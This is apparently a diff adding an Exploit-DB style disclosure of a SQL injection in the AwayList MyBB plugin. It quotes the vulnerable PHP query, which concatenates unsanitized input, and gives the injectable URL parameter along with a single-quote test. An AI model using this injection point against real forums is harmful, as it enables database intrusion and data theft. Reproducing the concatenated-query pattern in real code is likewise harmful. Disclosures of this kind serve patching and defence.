@@ -1,0 +1,23 @@
+# Exploit Title: AwayList MyBB plugin SQLi 0day
+# Exploit Author: Red_Hat [Team Vect0r]
+# Software Link: http://mods.mybb.com/view/awaylist
+# Tested on: Windows & Linux.
+
+
+Vulnerable code :
+
+<?php
+$query = $db->simple_select( // 245
+        "awaylist", '*', "id = '" . $mybb->input['id'] . "'" // 246
+    ); // 247
+    $item = $db->fetch_array($query); // 248
+?>
+
+The variable '$mybb->input['id']' remains unsanitized.
+
+Usage : http://server/index.php?action=editAwlItem&id=[SQLi]
+
+Exploit-DB Not:
+This is what worked for us: awaylist.php?action=editAwlItem&id=1'
+
+Shoutout to Zixem <3 & Team Vect0r :3
